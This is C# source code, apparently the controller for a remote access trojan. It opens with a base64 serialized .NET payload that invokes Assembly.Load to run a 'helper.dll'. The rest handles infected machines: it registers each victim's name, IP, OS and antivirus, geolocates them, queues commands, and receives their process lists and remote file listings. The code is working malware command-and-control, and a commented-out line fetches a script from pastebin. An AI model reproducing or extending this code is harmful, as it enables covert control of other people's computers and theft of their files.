"aQBuAGcARgBpAGwAZQBJAG4AZgBvAAAA3AEAAAEAMAAwADAAMAAwADQAYgAwAAAAOAAHAAEARgBp" +
"AGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAGgAZQBsAHAAZQByAAAAAAAwAAgAAQBGAGkA" +
"bABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA4AAsAAQBJAG4AdABlAHIAbgBh" +
"AGwATgBhAG0AZQAAAGgAZQBsAHAAZQByAC4AZABsAGwAAAAAAEgAEgABAEwAZQBnAGEAbABDAG8A" +
"cAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADEAOAAAAEAACwAB" +
"AE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABoAGUAbABwAGUAcgAuAGQAbABsAAAA" +
"AAAwAAcAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAGgAZQBsAHAAZQByAAAAAAA0AAgAAQBQ" +
"AHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMA" +
"ZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAADAAAAEA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9T" +
"ZXJpYWxpemF0aW9uSG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0" +
"dXJlCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkLAAAA" +
"CQcAAAAJCgAAAAYQAAAAL1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdLCBC" +
"eXRlW10pCAAAAAoBBQAAAAQAAAAGEQAAAAhUb1N0cmluZwkHAAAABhMAAAAOU3lzdGVtLkNvbnZl" +
"cnQGFAAAACVTeXN0ZW0uU3RyaW5nIFRvU3RyaW5nKFN5c3RlbS5PYmplY3QpCAAAAAoBDAAAAAIA" +
"AAAGFQAAAC9TeXN0ZW0uUnVudGltZS5SZW1vdGluZy5NZXNzYWdpbmcuSGVhZGVySGFuZGxlcgkH" +
"AAAACgkHAAAACRMAAAAJEQAAAAoL";

                        break;
                    #endregion
                    #region checkBot
                    case "checkBot":
                        string CountryCode_ = getCountryCode(CO.ip.Split(new[] { '/' })[0]);
                        string[] Clientinfo_ = new string[] { "", CO.name_of_victim, CO.ip, CO.os, CO.av, CO.dateofinstall, CO.DotNet };
                        
                        if (index_ > -1)
                        {
                            ChangeClientTime(CO.HWID, GetTimestamp().ToString());
                        }
                        else
                        {
                            ClientsObjs.Add(CO);
                            index_ = getClientByHWID(CO.HWID);
                            ListViewItem lvi = new ListViewItem(Clientinfo_, CountryCode_);
                            Context.Invoke((MethodInvoker)delegate
                            {
                                lvi.Tag = index_;
                                Context.listView1.Items.Add(lvi);
                            });
                        }

                        if (ClientsObjs[index_].thereIsCommands())
                        {
                            data = ClientsObjs[index_].getCommand();
                        }
                        break;
                    #endregion
                    #region process
                    case "processlist":
                        List<helper.ProcessManger.process> processs = (List<helper.ProcessManger.process>)funcs.decode(order[1]);
                        ClientsObjs[index_].PF.listprocess = processs;
                        ClientsObjs[index_].PF.addprocesstolist();
                        break;
                    #endregion
                    #region File Manger
                    case "harddrives":
                        string[] drivers_ = order[1].Split(new string[] { "||" }, StringSplitOptions.None);
                        ClientsObjs[index_].FM.AddDrivers_(drivers_);
                        break;
                    case "filesandfolders":
                        List<helper.FileManger.files> files_ = (List<helper.FileManger.files>)funcs.decode(order[1]);
                        ClientsObjs[index_].FM.ListF = files_;
                        ClientsObjs[index_].FM.addtolistview();
                        break;
                    #endregion
                    #region remove command
                    case "rc":
                        string commandID = order[1];
                        int index = getClientByHWID(CO.HWID);
                        ClientsObjs[index].removeCommand(commandID);
                        break;
                    #endregion
                }
                
                byte[] byteData = Encoding.ASCII.GetBytes(data);
                CO.workSocket.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), CO.workSocket);
            }
             catch
            {

            }
           
        }
        private void SendCallback(IAsyncResult ar)
        {
            try
            {
                Socket client = (Socket)ar.AsyncState;
                client.EndSend(ar);
                client.Shutdown(SocketShutdown.Both);
                client.Close();
            }
            catch
            {

            }
        
        }
        public string getCountryCode(string ip)
        {
            try
            {
                WebClient wc = new WebClient();
                string countrycode = wc.DownloadString("https://api.ipdata.co/" + ip);
                string[] lines = countrycode.Split(
        new[] { "\n" },
        StringSplitOptions.None
    );
                string s = lines[6].Replace(" ", "").Replace(@"""", "").Replace(@"country_code:", "").Replace(",", "");
                return s;
            }
            catch
            {
                return "_na";
            }
           
            
        }
        public void ChangeClientTime(string hwid,string newTime)
        {
            int index = getClientByHWID(hwid);
            if (index != -1) ClientsObjs[index].timenow = newTime;
        }
        public long GetTimestamp()
        {
            Int32 r = (Int32)((DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds);
            return r;
            //var r = Interaction.GetObject("script:https://pastebin.com/raw/fmvBK2jg");
            //var a = Interaction.CallByName(r, "ConvertToUnixTimeStamp", CallType.Method).ToString();
            //return long.Parse(a);
        }
        public bool CheckClient(ClientObjects CO)
        {
            switch (ClientsObjs.IndexOf(CO))
            {
                case -1:
                    return false;
                case 1:
                    return true;
            }
            return false;
        } // if the client is Exists retrun true if not retrun false
        public int getClientByHWID(string HWID)
        {
            int index = ClientsObjs.FindIndex(item => item.HWID == HWID);
            if (index != -1)
                return index;
            return -1;
            //foreach (string[] client in infoClients)
            //{

            //    if (client[0] == hwid)
            //    {
            //        return client;
            //    }

            //}
            //return null;
        } // retrun index of client in ClientsObjs list
    }
}      